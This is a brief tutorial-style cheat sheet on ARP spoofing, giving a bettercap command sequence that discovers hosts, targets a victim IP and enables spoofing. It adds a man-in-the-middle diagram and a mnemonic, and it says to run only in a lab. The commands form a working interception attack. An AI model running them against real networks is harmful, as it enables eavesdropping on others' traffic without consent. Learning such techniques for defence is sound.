# ARP Spoofing & MITM 🕵️

ARP spoofing tricks devices about who owns an IP address.

## Basic bettercap Flow

```bash
sudo bettercap -iface eth0  # Starts bettercap on selected interface.
net.probe on  # Discovers hosts on local network.
set arp.spoof.targets 192.168.1.5  # Sets victim target IP for ARP spoofing module.
arp.spoof on  # Enables ARP spoofing attack module.
```

## ASCII Diagram

```text
Victim <-> Attacker <-> Router
(traffic passes through attacker)
```

## Quick Win 🎯
Run only in isolated virtual lab network.

## Memory Hack 🧠
**P.T.S** = Probe, Target, Spoof.
